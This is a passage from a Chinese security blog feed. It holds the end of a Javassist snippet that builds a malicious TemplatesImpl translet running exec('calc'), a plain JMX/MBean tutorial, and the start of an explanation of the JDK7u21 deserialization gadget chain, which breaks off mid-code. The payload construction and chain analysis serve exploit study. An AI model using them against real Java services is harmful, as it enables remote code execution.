CannotCompileException, NotFoundException, IOException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">evilClassCalc</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;EvilClassCalc&quot;</span>);<br>        evilClassCalc.setSuperclass(pool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">ctConstructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, evilClassCalc);<br>        ctConstructor.setBody(<span class="hljs-string">&quot;        try &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            Runtime.getRuntime().exec(\&quot;calc\&quot;);\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125; catch (Exception var2) &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;&quot;</span>);<br>        evilClassCalc.addConstructor(ctConstructor);<br>        evilClassCalc.writeFile();<br>        evilClassCalc.detach();<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>我的错误是少加了一行</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">evilClassCalc.add<span class="hljs-constructor">Constructor(<span class="hljs-params">ctConstructor</span>)</span>;<br></code></pre></td></tr></table></figure><p>导致构造方法没有被成功加入，加上去就好了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Github CodeQL training 思路</title>
    <link href="/decemberus.com/2023/03/16/JMX%E5%AD%A6%E4%B9%A0/"/>
    <url>/decemberus.com/2023/03/16/JMX%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="JMX学习"><a href="#JMX学习" class="headerlink" title="JMX学习"></a>JMX学习</h1><h2 id="JMX的定义"><a href="#JMX的定义" class="headerlink" title="JMX的定义"></a>JMX的定义</h2><p>　　JMX(Java Management Extensions)是一个为应用程序植入管理功能的框架。JMX是一套标准的代理和服务，实际上，用户可以在任何Java应用程序中使用这些代理和服务实现管理。这是官方文档上的定义，我看过很多次也无法很好的理解。我个人的理解是JMX让程序有被管理的功能，例如你开发一个WEB网站，它是在24小时不间断运行，那么你肯定会对网站进行监控，如每天的UV、PV是多少；又或者在业务高峰的期间，你想对接口进行限流，就必须去修改接口并发的配置值。</p><p>　　应用场景：中间件软件WebLogic的管理页面就是基于JMX开发的，而JBoss则整个系统都基于JMX构架。</p><p>对于一些参数的修改，网上有一段描述还是比较形象的：</p><p>1、程序初哥一般是写死在程序中，到要改变的时候就去修改代码，然后重新编译发布。</p><p>2、程序熟手则配置在文件中（JAVA一般都是properties文件），到要改变的时候只要修改配置文件，但还是必须重启系统，以便读取配置文件里最新的值。</p><p>3、程序好手则会写一段代码，把配置值缓存起来，系统在获取的时候，先看看配置文件有没有改动，如有改动则重新从配置里读取，否则从缓存里读取。</p><p>4、程序高手则懂得物为我所用，用JMX把需要配置的属性集中在一个类中，然后写一个MBean，再进行相关配置。另外JMX还提供了一个工具页，以方便我们对参数值进行修改。</p><h2 id="JMX架构图"><a href="#JMX架构图" class="headerlink" title="JMX架构图"></a>JMX架构图</h2><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/831179-20160924113748309-1785034710.png" alt="img"> </p><p>从图中我们可以看到，JMX的结构一共分为三层：</p><p>1、基础层：主要是MBean，被管理的资源。</p><p>MBean分为如下四种，我接下来主要介绍standard MBean</p><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>standard MBean</td><td>这种类型的MBean最简单，它能管理的资源（包括属性，方法，时间）必须定义在接口中，然后MBean必须实现这个接口。它的命名也必须遵循一定的规范，例如我们的MBean为Hello，则接口必须为HelloMBean。</td></tr><tr><td>dynamic MBean</td><td>必须实现javax.management.DynamicMBean接口，所有的属性，方法都在运行时定义</td></tr><tr><td>open MBean</td><td>此MBean的规范还不完善，正在改进中</td></tr><tr><td>model MBean</td><td>与标准和动态MBean相比，你可以不用写MBean类，只需使用javax.management.modelmbean.RequiredModelMBean即可。RequiredModelMBean实现了ModelMBean接口，而ModelMBean扩展了DynamicMBean接口，因此与DynamicMBean相似，Model MBean的管理资源也是在运行时定义的。与DynamicMBean不同的是，DynamicMBean管理的资源一般定义在DynamicMBean中（运行时才决定管理那些资源），而model MBean管理的资源并不在MBean中，而是在外部（通常是一个类），只有在运行时，才通过set方法将其加入到model MBean中。后面的例子会有详细介绍</td></tr></tbody></table><p>2、适配层：MBeanServer，主要是提供对资源的注册和管理。</p><p>3、接入层：提供远程访问的入口。</p><p>接下来我这里会用程序来介绍三种访问JMX的方式：</p><h2 id="Jconsole的使用"><a href="#Jconsole的使用" class="headerlink" title="Jconsole的使用"></a>Jconsole的使用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jmx;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">HelloMBean</span><br>&#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span>;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(String age)</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">helloWorld</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">helloWorld</span><span class="hljs-params">(String str)</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getTelephone</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jmx;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HelloMBean</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String age;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br><br>        System.out.println(<span class="hljs-string">&quot;getname&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setname&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name=name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getage123&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(String age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setage&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age=age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">helloWorld</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;helloworld&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">helloWorld</span><span class="hljs-params">(String str)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;heloo&quot;</span>+str);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getTelephone</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;telephont&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jmx;<br><br><span class="hljs-keyword">import</span> javax.management.MBeanServer;<br><span class="hljs-keyword">import</span> javax.management.ObjectName;<br><span class="hljs-keyword">import</span> java.lang.management.ManagementFactory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">MBeanServer</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> ManagementFactory.getPlatformMBeanServer();<br>        <span class="hljs-type">ObjectName</span> <span class="hljs-variable">objectName</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectName</span>(<span class="hljs-string">&quot;jmxBean:name=hello&quot;</span>);<br>        <span class="hljs-comment">//创建并且注册MbeanServer</span><br>        server.registerMBean(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hello</span>(),objectName);<br>        Thread.sleep(<span class="hljs-number">60</span>*<span class="hljs-number">60</span>*<span class="hljs-number">1000</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>1、其中第13行是通过工厂类获取MBeanServer，用来做MBean的容器 。</p><p><strong>2、第14行中的ObjectName中的取名是有一定规范的，格式为：“域名：name&#x3D;MBean名称”，其中域名和MBean的名称可以任意取。这样定义后，就可以唯一标识我们定义的这个MBean的实现类了。</strong></p><p>3、第16行是将Hello这个类注入到MBeanServer中，注入需要创建一个ObjectName类 ，这样创建完毕以后最终会对应我们的JMX里面的东西</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230505192106336.png" alt="image-20230505192106336"> </p><p>这样，一个简单的JMX的DEMO已经写完了，现在我们通过JDK提供的Jconsole来进行操作。</p></blockquote><p>打出上面的代码，记住线程那一行非常重要</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230505191746027.png" alt="image-20230505191746027"> </p><p>在这个界面上，我们可以给程序中HelloMBean的属性赋值，也可以调用其中的方法：</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230505191841255.png" alt="image-20230505191841255"> </p><h2 id="通过客户端远程访问"><a href="#通过客户端远程访问" class="headerlink" title="通过客户端远程访问"></a>通过客户端远程访问</h2><p>对agent进行修改，增加ip和port的绑定</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jmxTest;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.management.ManagementFactory;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">import</span> javax.management.JMException;<br><span class="hljs-keyword">import</span> javax.management.MBeanServer;<br><span class="hljs-keyword">import</span> javax.management.ObjectName;<br><span class="hljs-keyword">import</span> javax.management.remote.JMXConnectorServer;<br><span class="hljs-keyword">import</span> javax.management.remote.JMXConnectorServerFactory;<br><span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloAgent</span><br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> JMException, NullPointerException<br>    &#123;<br>        <span class="hljs-type">MBeanServer</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> ManagementFactory.getPlatformMBeanServer();<br>        <span class="hljs-type">ObjectName</span> <span class="hljs-variable">helloName</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectName</span>(<span class="hljs-string">&quot;jmxBean:name=hello&quot;</span>);<br>        <span class="hljs-comment">//create mbean and register mbean</span><br>        server.registerMBean(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hello</span>(), helloName);<br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            <span class="hljs-comment">//这个步骤很重要，注册一个端口，绑定url后用于客户端通过rmi方式连接JMXConnectorServer</span><br>            LocateRegistry.createRegistry(<span class="hljs-number">9999</span>);<br>            <span class="hljs-comment">//URL路径的结尾可以随意指定，但如果需要用Jconsole来进行连接，则必须使用jmxrmi</span><br>            <span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span><br>                  (<span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://localhost:9999/jmxrmi&quot;</span>);<br>            <span class="hljs-type">JMXConnectorServer</span> <span class="hljs-variable">jcs</span> <span class="hljs-operator">=</span> JMXConnectorServerFactory.newJMXConnectorServer(url, <span class="hljs-literal">null</span>, server);<br>            System.out.println(<span class="hljs-string">&quot;begin rmi start&quot;</span>);<br>            jcs.start();<br>            System.out.println(<span class="hljs-string">&quot;rmi start&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (RemoteException e)<br>        &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (IOException e)<br>        &#123;<br>            e.printStackTrace();<br>        &#125;<br>      <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>用JConsole连接的时候选择远程连接，url写localhost:9999</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230505194027896.png" alt="image-20230505194027896"> </p><p>同样可以进行方法的调用</p><p>如果不使用Jconsole的画，我们需要使用客户端与agent进行交互，添加客户端client用于与agent进行连接</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> jmx;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">import</span> javax.management.Attribute;<br><span class="hljs-keyword">import</span> javax.management.MBeanServerConnection;<br><span class="hljs-keyword">import</span> javax.management.MBeanServerInvocationHandler;<br><span class="hljs-keyword">import</span> javax.management.ObjectName;<br><span class="hljs-keyword">import</span> javax.management.remote.JMXConnector;<br><span class="hljs-keyword">import</span> javax.management.remote.JMXConnectorFactory;<br><span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span><br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, Exception, NullPointerException<br>    &#123;<br>        <span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span><br>                (<span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://localhost:9999/jmxrmi&quot;</span>);<br>        <span class="hljs-type">JMXConnector</span> <span class="hljs-variable">jmxc</span> <span class="hljs-operator">=</span> JMXConnectorFactory.connect(url,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">MBeanServerConnection</span> <span class="hljs-variable">mbsc</span> <span class="hljs-operator">=</span> jmxc.getMBeanServerConnection();<br>        <span class="hljs-comment">//ObjectName的名称与前面注册时候的保持一致</span><br>        <span class="hljs-type">ObjectName</span> <span class="hljs-variable">mbeanName</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectName</span>(<span class="hljs-string">&quot;jmxBean:name=hello&quot;</span>);<br><br>        System.out.println(<span class="hljs-string">&quot;Domains ......&quot;</span>);<br>        String[] domains = mbsc.getDomains();<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;domains.length;i++)<br>        &#123;<br>            System.out.println(<span class="hljs-string">&quot;doumain[&quot;</span> + i + <span class="hljs-string">&quot;]=&quot;</span> + domains[i] );<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;MBean count = &quot;</span> + mbsc.getMBeanCount());<br>        <span class="hljs-comment">//设置指定Mbean的特定属性值</span><br>        <span class="hljs-comment">//这里的setAttribute、getAttribute操作只能针对bean的属性</span><br>        <span class="hljs-comment">//例如对getName或者setName进行操作，只能使用Name，需要去除方法的前缀</span><br>        mbsc.setAttribute(mbeanName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Attribute</span>(<span class="hljs-string">&quot;Name&quot;</span>,<span class="hljs-string">&quot;杭州&quot;</span>));<br>        mbsc.setAttribute(mbeanName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Attribute</span>(<span class="hljs-string">&quot;Age&quot;</span>,<span class="hljs-string">&quot;1990&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> (String)mbsc.getAttribute(mbeanName, <span class="hljs-string">&quot;Age&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (String)mbsc.getAttribute(mbeanName, <span class="hljs-string">&quot;Name&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;age=&quot;</span> + age + <span class="hljs-string">&quot;;name=&quot;</span> + name);<br><span class="hljs-comment">//通过代理调用方法</span><br>        <span class="hljs-type">HelloMBean</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> MBeanServerInvocationHandler.<br>                newProxyInstance(mbsc, mbeanName, HelloMBean.class, <span class="hljs-literal">false</span>);<br>        proxy.helloWorld();<br>        proxy.helloWorld(<span class="hljs-string">&quot;migu&quot;</span>);<br>        proxy.getTelephone();<br>        <span class="hljs-comment">//invoke调用bean的方法，只针对非设置属性的方法</span><br>        <span class="hljs-comment">//例如invoke不能对getName方法进行调用</span><br>        <span class="hljs-comment">//通过反射掉哦那个方法</span><br>        mbsc.invoke(mbeanName, <span class="hljs-string">&quot;getTelephone&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        mbsc.invoke(mbeanName, <span class="hljs-string">&quot;helloWorld&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;I&#x27;ll connect to JMX Server via client2&quot;</span>&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;java.lang.String&quot;</span>&#125;);<br>        mbsc.invoke(mbeanName, <span class="hljs-string">&quot;helloWorld&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>7U21与8U20</title>
    <link href="/decemberus.com/2023/03/12/%E5%8E%9F%E7%94%9FJDK7u21%E4%B8%8E8u20/"/>
    <url>/decemberus.com/2023/03/12/%E5%8E%9F%E7%94%9FJDK7u21%E4%B8%8E8u20/</url>
    
    <content type="html"><![CDATA[<h1 id="原生JDK7u21"><a href="#原生JDK7u21" class="headerlink" title="原生JDK7u21"></a>原生JDK7u21</h1><p>参考P神的讲解进行了一定的注释与修改</p><h2 id="核心原理"><a href="#核心原理" class="headerlink" title="核心原理"></a>核心原理</h2><p>相信学习了CommonsCollections的这些利用链后，大家心里对反序列化有自己的认识。如果问，什么是某条反序列化利用链的核心点，有的同学可能会说是readObject或TemplatesImpl。不过我的理解是，核心在于触发“动态方法执行”的地方，而不是TemplatesImpl或某个类的readObject方法。</p><p>一个例子</p><ul><li>CC系列利用链核心是那一堆Transformer，特别是其中的<code>InvokerTransformer</code>，<code>InstantiateTransformer</code></li><li>CB反序列化的核心是<code>PropertyUtils#getProperty</code>，因为他会触发任意对象的getter</li></ul><p>JDK7u21的核心是<code>sun.reflect.annotation.AnnotationInvocationHandler</code></p><p>看这个类中的<code>equalsImpl</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Boolean <span class="hljs-title function_">equalsImpl</span><span class="hljs-params">(Object o)</span> &#123;<br>    <span class="hljs-keyword">if</span> (o == <span class="hljs-built_in">this</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">if</span> (!type.isInstance(o))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span> (Method memberMethod : getMemberMethods()) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> memberMethod.getName();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">ourValue</span> <span class="hljs-operator">=</span> memberValues.get(member);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">hisValue</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">AnnotationInvocationHandler</span> <span class="hljs-variable">hisHandler</span> <span class="hljs-operator">=</span> asOneOfUs(o);<br>        <span class="hljs-keyword">if</span> (hisHandler != <span class="hljs-literal">null</span>) &#123;<br>            hisValue = hisHandler.memberValues.get(member);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                hisValue = memberMethod.invoke(o);<br>            &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(e);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!memberValueEquals(ourValue, hisValue))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">volatile</span> Method[] memberMethods = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> Method[] getMemberMethods() &#123;<br>    <span class="hljs-keyword">if</span> (memberMethods == <span class="hljs-literal">null</span>) &#123;<br>        memberMethods = AccessController.doPrivileged(<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;Method[]&gt;() &#123;<br>                <span class="hljs-keyword">public</span> Method[] run() &#123;<br>                    <span class="hljs-keyword">final</span> Method[] mm = type.getDeclaredMethods();<br>                    AccessibleObject.setAccessible(mm, <span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">return</span> mm;<br>                &#125;<br>            &#125;);<br>    &#125;<br>    <span class="hljs-keyword">return</span> memberMethods;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法中有个很明显的反射调用 <code>memberMethod.invoke(o)</code> ，而 memberMethod 来自于<code>this.type.getDeclaredMethods()</code> 。</p><p>也就是说，equalsImpl 这个方法是将 this.type 类中的所有方法遍历并执行了。那么，假设this.type 是Templates类，则势必会调用到其中的 <code>newTransformer()</code> 或 <code>getOutputProperties()</code>方法，进而触发任意代码执行。</p><p>这就是JDK7u21的核心原理。</p><h2 id="如何调用equalsImpl"><a href="#如何调用equalsImpl" class="headerlink" title="如何调用equalsImpl"></a>如何调用equalsImpl</h2><p>那么，现在的任务就是通过反序列化调用 equalsImpl ， equalsImpl 是一个私有方法，在<code>AnnotationInvocationHandler#invoke</code> 中被调用。</p><p>调用私有方法可以使用Java代理</p><p>InvocationHandler只有一个接口，方法是invoke</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 